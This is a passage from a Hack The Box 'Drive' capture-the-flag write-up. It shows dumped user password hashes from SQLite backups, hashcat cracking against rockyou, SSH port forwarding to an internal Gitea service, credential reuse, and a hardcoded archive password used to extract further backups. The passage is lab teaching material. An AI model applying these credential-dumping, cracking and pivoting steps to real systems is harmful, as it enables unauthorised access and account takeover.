+<span class="mi">24</span><span class="o">|</span><span class="n">sha1</span><span class="err">$</span><span class="n">ALgmoJHkrqcEDinLzpILpD</span><span class="err">$</span><span class="mi">4</span><span class="n">b835a084a7c65f5fe966d522c0efcdd1d6f879f</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span> <span class="mi">16</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">53</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="n">crisDisel</span><span class="o">|||</span><span class="n">cris</span><span class="nd">@drive</span><span class="o">.</span><span class="n">htb</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">23</span> <span class="mi">12</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">15</span>
+<span class="mi">30</span><span class="o">|</span><span class="n">sha1</span><span class="err">$</span><span class="n">jzpj8fqBgy66yby2vX5XPa</span><span class="err">$</span><span class="mi">52</span><span class="n">f17d6118fce501e3b60de360d4c311337836a3</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">26</span> <span class="mi">05</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mf">40.388717</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="n">admin</span><span class="o">|||</span><span class="n">admin</span><span class="nd">@drive</span><span class="o">.</span><span class="n">htb</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">26</span> <span class="mi">05</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mf">58.003372</span>
+<span class="n">sqlite</span><span class="o">&gt;</span>
+</pre></div>
+<p>Of course, they are encrypted. Let's try to crack them; being hashed with <code>SHA1</code>, it will be fast. To do this, I will utilize hashcat, since john didn't work for me:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">124</span> <span class="o">-</span><span class="n">a</span> <span class="mi">0</span> <span class="n">hashes</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Passwords</span><span class="o">/</span><span class="n">Leaked</span><span class="o">-</span><span class="n">Databases</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> 
+<span class="n">sha1</span><span class="err">$</span><span class="n">kyvDtANaFByRUMNSXhjvMc</span><span class="err">$</span><span class="mf">9e77</span><span class="n">fb56c31e7ff032f8deb1f0b5e8f42e9e3004</span><span class="p">:</span><span class="n">john316</span>
+</pre></div>
+<p>It only cracked one of the five hashes; this hash belongs to the user <code>Tom</code>. Let's use it to switch to the <code>Tom</code> user on the system:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">martin@drive</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backups$</span> <span class="n">su</span> <span class="n">tom</span>
+<span class="n">Password</span><span class="p">:</span> 
+<span class="n">su</span><span class="p">:</span> <span class="n">Authentication</span> <span class="n">failure</span>
+<span class="nd">martin@drive</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backups$</span>
+</pre></div>
+<p>But it didn't work, so at this point, the password is useless.</p><br/>
+<p>While examining the open ports on the victim machine, I noticed that port 3000 is open internally. This means I can't access it directly from my attacker machine unless I use port forwarding:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">martin@drive</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backups$</span> <span class="n">ss</span> <span class="o">-</span><span class="n">nltp</span>
+<span class="n">State</span>     <span class="n">Recv</span><span class="o">-</span><span class="n">Q</span>    <span class="n">Send</span><span class="o">-</span><span class="n">Q</span>       <span class="n">Local</span> <span class="n">Address</span><span class="p">:</span><span class="n">Port</span>        <span class="n">Peer</span> <span class="n">Address</span><span class="p">:</span><span class="n">Port</span>   <span class="n">Process</span>   
+<span class="n">LISTEN</span>    <span class="mi">0</span>         <span class="mi">151</span>              <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">3306</span>             <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>                
+<span class="n">LISTEN</span>    <span class="mi">0</span>         <span class="mi">511</span>                <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span>               <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>                
+<span class="n">LISTEN</span>    <span class="mi">0</span>         <span class="mi">4096</span>         <span class="mf">127.0.0.53</span><span class="o">%</span><span class="n">lo</span><span class="p">:</span><span class="mi">53</span>               <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>                
+<span class="n">LISTEN</span>    <span class="mi">0</span>         <span class="mi">128</span>                <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">22</span>               <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>                
+<span class="n">LISTEN</span>    <span class="mi">0</span>         <span class="mi">70</span>               <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">33060</span>            <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>                
+<span class="n">LISTEN</span>    <span class="mi">0</span>         <span class="mi">511</span>                   <span class="p">[::]:</span><span class="mi">80</span>                  <span class="p">[::]:</span><span class="o">*</span>                
+<span class="n">LISTEN</span>    <span class="mi">0</span>         <span class="mi">128</span>                   <span class="p">[::]:</span><span class="mi">22</span>                  <span class="p">[::]:</span><span class="o">*</span>                
+<span class="n">LISTEN</span>    <span class="mi">0</span>         <span class="mi">4096</span>                     <span class="o">*</span><span class="p">:</span><span class="mi">3000</span>                   <span class="o">*</span><span class="p">:</span><span class="o">*</span>                
+<span class="nd">martin@drive</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backups$</span>
+</pre></div>
+<p>Using curl, we determined that port 3000 is associated with an HTTP service, specifically running Gitea 1.17.4:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">martin@drive</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backups$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="n">localhost</span><span class="p">:</span><span class="mi">3000</span>
+<span class="o">&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">html</span> <span class="n">lang</span><span class="o">=</span><span class="s2">"en-US"</span> <span class="n">class</span><span class="o">=</span><span class="s2">"theme-"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">meta</span> <span class="n">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="n">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1"</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span> <span class="n">Gitea</span><span class="p">:</span> <span class="n">Git</span> <span class="k">with</span> <span class="n">a</span> <span class="n">cup</span> <span class="n">of</span> <span class="n">tea</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+            <span class="n">Powered</span> <span class="n">by</span> <span class="n">Gitea</span>
+
+                <span class="n">Version</span><span class="p">:</span>
+
+                    <span class="mf">1.17.4</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
+
+<span class="nd">martin@drive</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backups$</span>
+</pre></div>
+<p>To enable port forwarding, use SSH with the <code>-L</code> parameter. This will grant us access to the website through our attacker machine.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ssh</span> <span class="n">martin</span><span class="o">@</span><span class="mf">10.10.11.235</span> <span class="o">-</span><span class="n">L</span> <span class="mi">3000</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">3000</span>
+<span class="n">martin</span><span class="o">@</span><span class="mf">10.10.11.235</span><span class="s1">'s password: </span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="nd">martin@drive</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p>Now, we can access the website through our browser:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/19.png"/></p><br/>
+<p>Clicking on "Explore", we noticed there are no public repositories.</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/20.png"/></p><br/>
+<p>By clicking on "Users", we can list existing users on Gitea:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/21.png"/></p><br/>
+<p>There are two users; the most relevant here is <code>martinCruz</code>. Since we obtained credentials for the user <code>martin</code> on the system, let's try these credentials in the login section:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/22.png"/></p><br/>
+<p>We have successfully logged in, and clicking on <code>Explore</code>, we notice a new repo:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/23.png"/></p><br/>
+<p>It contains the source code of the DoodleGrive website:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/24.png"/></p><br/>
+<p>There is also a bash script named <code>db_backup.sh</code>. Let's inspect its content:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/25.png"/></p><br/>
+<p>It contains a hardcoded password used for compressing the files. Now, we can decompress the other compressed files.</p><br/>
+<p>I downloaded all the compressed files on my attacker machine, and now I will extract their content using <code>7z</code> and the password we obtained</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="mi">7</span><span class="n">z</span> <span class="n">x</span> <span class="mi">1</span><span class="n">_Dec_db_backup</span><span class="o">.</span><span class="n">sqlite3</span><span class="mf">.7</span><span class="n">z</span> <span class="o">-</span><span class="n">p</span><span class="s1">'H@ckThisP@ssW0rDIfY0uC@n:)'</span>
+
+<span class="n">Extracting</span> <span class="n">archive</span><span class="p">:</span> <span class="mi">1</span><span class="n">_Dec_db_backup</span><span class="o">.</span><span class="n">sqlite3</span><span class="mf">.7</span><span class="n">z</span>
+<span class="o">--</span>
+<span class="n">Path</span> <span class="o">=</span> <span class="mi">1</span><span class="n">_Dec_db_backup</span><span class="o">.</span><span class="n">sqlite3</span><span class="mf">.7</span><span class="n">z</span>
+<span class="n">Type</span> <span class="o">=</span> <span class="mi">7</span><span class="n">z</span>
+<span class="n">Physical</span> <span class="n">Size</span> <span class="o">=</span> <span class="mi">13018</span>
+<span class="n">Headers</span> <span class="n">Size</span> <span class="o">=</span> <span class="mi">170</span>
+<span class="n">Method</span> <span class="o">=</span> <span class="n">LZMA2</span><span class="p">:</span><span class="mi">22</span> <span class="mi">7</span><span class="n">zAES</span>
+<span class="n">Solid</span> <span class="o">=</span> <span class="o">-</span>
+<span class="n">Blocks</span> <span class="o">=</span> <span class="mi">1</span>
+
+<span class="n">Everything</span> <span class="ow">is</span> <span class="n">Ok</span>             
+
+<span class="n">Size</span><span class="p">:</span>       <span class="mi">3760128</span>
+<span class="n">Compressed</span><span class="p">:</span> <span class="mi">13018</span>
+</pre></div>
+<p>After extracting all compressed files, I noticed there were additional databases.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">sqlite3</span> <span class="n">db</span><span class="o">.</span><span class="n">sqlite3</span>
+<span class="n">SQLite</span> <span class="n">version</span> <span class="mf">3.37.2</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">06</span> <span class="mi">13</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">41</span>
+<span class="n">Enter</span> <span class="s2">".help"</span> <span class="k">for</span> <span class="n">usage</span> <span class="n">hints</span><span class="o">.</span>
+<span class="n">sqlite</span><span class="o">&gt;</span>
+</pre></div>
+<p>These databases contain previous credentials:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">sqlite</span><span class="o">&gt;</span> <span class="n">select</span> <span class="o">*</span> <span class="kn">from</span> <span class="nn">accounts_customuser</span><span class="p">;</span>
+<span class="mi">16</span><span class="o">|</span><span class="n">pbkdf2_sha256</span><span class="err">$</span><span class="mi">390000</span><span class="err">$</span><span class="n">ZjZj164ssfwWg7UcR8q4kZ</span><span class="err">$</span><span class="n">KKbWkEQCpLzYd82QUBq65aA9j3</span><span class="o">+</span><span class="n">IkHI6KK9Ue8nZeFU</span><span class="o">=|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">26</span> <span class="mi">06</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mf">34.294890</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="n">admin</span><span class="o">|||</span><span class="n">admin</span><span class="nd">@drive</span><span class="o">.</span><span class="n">htb</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">08</span> <span class="mi">14</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mf">02.802351</span>
+<span class="mi">21</span><span class="o">|</span><span class="n">pbkdf2_sha256</span><span class="err">$</span><span class="mi">390000</span><span class="err">$</span><span class="n">npEvp7CFtZzEEVp9lqDJOO</span><span class="err">$</span><span class="n">So15</span><span class="o">//</span><span class="n">tmwvM9lEtQshaDv</span><span class="o">+</span><span class="n">mFMESNQKIKJ8vj</span><span class="o">/</span><span class="n">dP4WIo</span><span class="o">=|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span> <span class="mi">22</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mf">42.847497</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="n">jamesMason</span><span class="o">|||</span><span class="n">jamesMason</span><span class="nd">@drive</span><span class="o">.</span><span class="n">htb</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">23</span> <span class="mi">12</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mf">04.637591</span>
+<span class="mi">22</span><span class="o">|</span><span class="n">pbkdf2_sha256</span><span class="err">$</span><span class="mi">390000</span><span class="err">$</span><span class="n">GRpDkOskh4irD53lwQmfAY</span><span class="err">$</span><span class="n">klDWUZ9G6k4KK4VJUdXqlHrSaWlRLOqxEvipIpI5NDM</span><span class="o">=|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span> <span class="mi">12</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="mf">10.152415</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="n">martinCruz</span><span class="o">|||</span><span class="n">martin</span><span class="nd">@drive</span><span class="o">.</span><span class="n">htb</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">23</span> <span class="mi">12</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="mf">02.230289</span>
+<span class="mi">23</span><span class="o">|</span><span class="n">pbkdf2_sha256</span><span class="err">$</span><span class="mi">390000</span><span class="err">$</span><span class="n">wWT8yUbQnRlMVJwMAVHJjW</span><span class="err">$</span><span class="n">B98WdQOfutEZ8lHUcGeo3nR326QCQjwZ9lKhfk9gtro</span><span class="o">=|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">26</span> <span class="mi">06</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mf">23.299662</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="n">tomHands</span><span class="o">|||</span><span class="n">tom</span><span class="nd">@drive</span><span class="o">.</span><span class="n">htb</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">23</span> <span class="mi">12</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">45</span>
+<span class="mi">24</span><span class="o">|</span><span class="n">pbkdf2_sha256</span><span class="err">$</span><span class="mi">390000</span><span class="err">$</span><span class="n">TBrOKpDIumk7FP0m0FosWa</span><span class="err">$</span><span class="n">t2wHR09YbXbB0pKzIVIn9Y3jlI3pzH0</span><span class="o">/</span><span class="n">jjXK0RDcP6U</span><span class="o">=|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span> <span class="mi">16</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mf">53.717055</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="n">crisDisel</span><span class="o">|||</span><span class="n">cris</span><span class="nd">@drive</span><span class="o">.</span><span class="n">htb</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">23</span> <span class="mi">12</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mf">15.072407</span>
+<span class="n">sqlite</span><span class="o">&gt;</span>
+</pre></div>
+<p>This time, the hashes are encrypted using the <code>pbkdf2_sha256</code> format, making it time-consuming to crack. This was only in the <code>1_Dec_db_backup.sqlite3</code> file; the other files had SHA1 hashes.</p><br/>
+<p>For example, let's look at the <code>1_Nov_db_backup.sqlite3.7z</code> file:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">sqlite3</span> <span class="n">db</span><span class="o">.</span><span class="n">sqlite3</span>
+<span class="n">SQLite</span> <span class="n">version</span> <span class="mf">3.37.2</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">06</span> <span class="mi">13</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">41</span>
+<span class="n">Enter</span> <span class="s2">".help"</span> <span class="k">for</span> <span class="n">usage</span> <span class="n">hints</span><span class="o">.</span>
+<span class="n">sqlite</span><span class="o">&gt;</span> <span class="n">select</span> <span class="o">*</span> <span class="kn">from</span> <span class="nn">accounts_customuser</span><span class="p">;</span>
+<span class="mi">21</span><span class="o">|</span><span class="n">sha1</span><span class="err">$</span><span class="n">W5IGzMqPgAUGMKXwKRmi08</span><span class="err">$</span><span class="mi">030814</span><span class="n">d90a6a50ac29bb48e0954a89132302483a</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">26</span> <span class="mi">05</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mf">27.497873</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="n">jamesMason</span><span class="o">|||</span><span class="n">jamesMason</span><span class="nd">@drive</span><span class="o">.</span><span class="n">htb</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">23</span> <span class="mi">12</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">04</span>
+<span class="mi">22</span><span class="o">|</span><span class="n">sha1</span><span class="err">$</span><span class="n">E9cadw34Gx4E59Qt18NLXR</span><span class="err">$</span><span class="mi">60919</span><span class="n">b923803c52057c0cdd1d58f0409e7212e9f</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span> <span class="mi">12</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="mi">10</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="n">martinCruz</span><span class="o">|||</span><span class="n">martin</span><span class="nd">@drive</span><span class="o">.</span><span class="n">htb</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">23</span> <span class="mi">12</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="mi">02</span>
+<span class="mi">23</span><span class="o">|</span><span class="n">sha1</span><span class="err">$</span><span class="n">Ri2bP6RVoZD5XYGzeYWr7c</span><span class="err">$</span><span class="mi">4053</span><span class="n">cb928103b6a9798b2521c4100db88969525a</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span> <span class="mi">13</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">45</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="n">tomHands</span><span class="o">|||</span><span class="n">tom</span><span class="nd">@drive</span><span class="o">.</span><span class="n">htb</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">23</span> <span class="mi">12</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">45</span>
+<span class="mi">24</span><span class="o">|</span><span class="n">sha1</span><span class="err">$</span><span class="n">ALgmoJHkrqcEDinLzpILpD</span><span class="err">$</span><span class="mi">4</span><span class="n">b835a084a7c65f5fe966d522c0efcdd1d6f879f</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span> <span class="mi">16</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">53</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="n">crisDisel</span><span class="o">|||</span><span class="n">cris</span><span class="nd">@drive</span><span class="o">.</span><span class="n">htb</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">23</span> <span class="mi">12</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">15</span>
+<span class="mi">30</span><span class="o">|</span><span class="n">sha1</span><span class="err">$</span><span class="n">jzpj8fqBgy66yby2vX5XPa</span><span class="err">$</span><span class="mi">52</span><span class="n">f17d6118fce501e3b60de360d4c311337836a3</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">26</span> <span class="mi">05</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mf">40.388717</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="n">admin</span><span class="o">|||</span><span class="n">admin</span><span class="nd">@drive</span><span class="o">.</span><span class="n">htb</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">26</span> <span class="mi">05</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mf">58.003372</span>
+<span class="n">sqlite</span><span class="o">&gt;</span>
+</pre></div>
+<p>I extracted all SHA1 hashes from the databases and saved them in a file:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="n">hashes</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">jzpj8fqBgy66yby2vX5XPa</span><span class="err">$</span><span class="mi">52</span><span class="n">f17d6118fce501e3b60de360d4c311337836a3</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">ALgmoJHkrqcEDinLzpILpD</span><span class="err">$</span><span class="mi">4</span><span class="n">b835a084a7c65f5fe966d522c0efcdd1d6f879f</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">Ri2bP6RVoZD5XYGzeYWr7c</span><span class="err">$</span><span class="mi">4053</span><span class="n">cb928103b6a9798b2521c4100db88969525a</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">E9cadw34Gx4E59Qt18NLXR</span><span class="err">$</span><span class="mi">60919</span><span class="n">b923803c52057c0cdd1d58f0409e7212e9f</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">W5IGzMqPgAUGMKXwKRmi08</span><span class="err">$</span><span class="mi">030814</span><span class="n">d90a6a50ac29bb48e0954a89132302483a</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">jzpj8fqBgy66yby2vX5XPa</span><span class="err">$</span><span class="mi">52</span><span class="n">f17d6118fce501e3b60de360d4c311337836a3</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">ALgmoJHkrqcEDinLzpILpD</span><span class="err">$</span><span class="mi">4</span><span class="n">b835a084a7c65f5fe966d522c0efcdd1d6f879f</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">Ri2bP6RVoZD5XYGzeYWr7c</span><span class="err">$</span><span class="mi">71</span><span class="n">eb1093e10d8f7f4d1eb64fa604e6050f8ad141</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">E9cadw34Gx4E59Qt18NLXR</span><span class="err">$</span><span class="mi">60919</span><span class="n">b923803c52057c0cdd1d58f0409e7212e9f</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">W5IGzMqPgAUGMKXwKRmi08</span><span class="err">$</span><span class="mi">030814</span><span class="n">d90a6a50ac29bb48e0954a89132302483a</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">W5IGzMqPgAUGMKXwKRmi08</span><span class="err">$</span><span class="mi">030814</span><span class="n">d90a6a50ac29bb48e0954a89132302483a</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">E9cadw34Gx4E59Qt18NLXR</span><span class="err">$</span><span class="mi">60919</span><span class="n">b923803c52057c0cdd1d58f0409e7212e9f</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">DhWa3Bym5bj9Ig73wYZRls</span><span class="err">$</span><span class="mi">3</span><span class="n">ecc0c96b090dea7dfa0684b9a1521349170fc93</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">ALgmoJHkrqcEDinLzpILpD</span><span class="err">$</span><span class="mi">4</span><span class="n">b835a084a7c65f5fe966d522c0efcdd1d6f879f</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">jzpj8fqBgy66yby2vX5XPa</span><span class="err">$</span><span class="mi">52</span><span class="n">f17d6118fce501e3b60de360d4c311337836a3</span>
+</pre></div>
+<p>Noticing some repeated hashes, I used <code>sort -u</code> to keep unique strings.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="n">hashes</span> <span class="o">|</span> <span class="n">sort</span> <span class="o">-</span><span class="n">u</span> <span class="o">|</span> <span class="n">sponge</span> <span class="n">hashes</span>
+</pre></div>
+<p>Now, there are only 7 different hashes:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="n">hashes</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">ALgmoJHkrqcEDinLzpILpD</span><span class="err">$</span><span class="mi">4</span><span class="n">b835a084a7c65f5fe966d522c0efcdd1d6f879f</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">DhWa3Bym5bj9Ig73wYZRls</span><span class="err">$</span><span class="mi">3</span><span class="n">ecc0c96b090dea7dfa0684b9a1521349170fc93</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">E9cadw34Gx4E59Qt18NLXR</span><span class="err">$</span><span class="mi">60919</span><span class="n">b923803c52057c0cdd1d58f0409e7212e9f</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">jzpj8fqBgy66yby2vX5XPa</span><span class="err">$</span><span class="mi">52</span><span class="n">f17d6118fce501e3b60de360d4c311337836a3</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">Ri2bP6RVoZD5XYGzeYWr7c</span><span class="err">$</span><span class="mi">4053</span><span class="n">cb928103b6a9798b2521c4100db88969525a</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">Ri2bP6RVoZD5XYGzeYWr7c</span><span class="err">$</span><span class="mi">71</span><span class="n">eb1093e10d8f7f4d1eb64fa604e6050f8ad141</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">W5IGzMqPgAUGMKXwKRmi08</span><span class="err">$</span><span class="mi">030814</span><span class="n">d90a6a50ac29bb48e0954a89132302483a</span>
+</pre></div>
+<p>Finally, with <code>hashcat</code>, we can crack them:</p><br/>
